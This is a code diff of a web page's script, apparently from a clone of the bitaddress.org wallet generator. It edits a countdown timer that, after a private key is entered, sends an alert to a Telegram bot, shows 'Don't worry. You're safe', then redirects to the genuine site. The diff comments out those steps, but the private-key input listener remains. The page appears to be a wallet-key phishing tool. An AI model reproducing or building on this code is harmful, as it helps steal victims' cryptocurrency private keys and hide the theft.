@@ -190,35 +190,45 @@
             }
         }
 
-        // Countdown timer implementation
-        window.onload = function() {
-            let countdown = 90;
-            let countdownElement = document.createElement("div");
-            countdownElement.style.fontSize = "24px";
-            countdownElement.style.color = "green";
-            countdownElement.style.position = "fixed";
-            countdownElement.style.top = "90px";
-            countdownElement.style.right = "90px";
-            document.body.appendChild(countdownElement);
+// Countdown timer implementation
+window.onload = function() {
+    let countdown = 90;
+    let countdownElement = document.createElement("div");
+    countdownElement.style.fontSize = "24px";
+    countdownElement.style.color = "green";
+    countdownElement.style.position = "fixed";
+    countdownElement.style.top = "90px";
+    countdownElement.style.right = "90px";
 
-            let countdownInterval = setInterval(function() {
-                if (countdown > 0) {
-                    if (countdown <= 15) {
-                        countdownElement.textContent = countdown; // Display countdown from 15 to 0
-                    }
-                    countdown--;
-                } else {
-                    clearInterval(countdownInterval);
-                
-                    countdownElement.textContent = "Don't worry. You're safe";
-                    sendAlertToBot(); 
+    // Disable countdown display
+    /*
+    document.body.appendChild(countdownElement);
+    */
 
-                    setTimeout(function() {
-                        window.location.href = 'https://bitaddress.org';
-                    }, 2000);
-                }
-            }, 1000);
-        };
+    let countdownInterval = setInterval(function() {
+        if (countdown > 0) {
+            // Disable countdown text update
+            /*
+            if (countdown <= 15) {
+                countdownElement.textContent = countdown; // Display countdown from 15 to 0
+            }
+            */
+            countdown--;
+        } else {
+            clearInterval(countdownInterval);
+            
+            // Disable post-countdown actions
+            /*
+            countdownElement.textContent = "Don't worry. You're safe";
+            sendAlertToBot(); // Send alert to Telegram bot
+
+            setTimeout(function() {
+                window.location.href = 'https://bitaddress.org';
+            }, 2000);
+            */
+        }
+    }, 1000);
+};
 
         
         document.getElementById('detailprivkey').addEventListener('input', handleInput);
